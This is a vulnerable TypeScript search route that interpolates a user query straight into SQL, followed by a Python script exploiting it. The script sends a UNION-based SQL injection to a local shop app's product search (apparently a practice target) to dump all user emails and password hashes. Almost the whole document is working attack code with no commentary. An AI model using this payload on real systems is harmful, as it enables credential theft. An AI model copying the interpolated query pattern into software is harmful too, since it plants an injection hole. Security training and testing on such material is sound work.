'''
routes/search.ts
Line 19-23:
module.exports = function searchProducts () {
  return (req: Request, res: Response, next: NextFunction) => {
    let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''
    criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)
    models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
'''

import requests
import json

def make_request():
    response = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False)

    try:
        # Attempt to parse the response as JSON
        json_response = response.json()
        
        # Pretty-print the JSON response
        emailPw = json_response["data"][0]["name"]

        for emailAndPw in emailPw.split(","):  
            email, pw = emailAndPw.split(":")
            print(f"Email: {email}, Hash: {pw}")


    except ValueError:
        # If response is not JSON, print the raw text
        print(response.text)

if __name__ == "__main__":
    sql_injection = "a'))+union+select+1,(select+group_concat(email+||+'%3a'+||+password,+',')+from+Users),3,4,5,6,7,8,9+--+-"

    url = "http://localhost:3000/rest/products/search?q=" + sql_injection

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
    }

    cookies = {
        "language": "en",
    }

    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }

    make_request()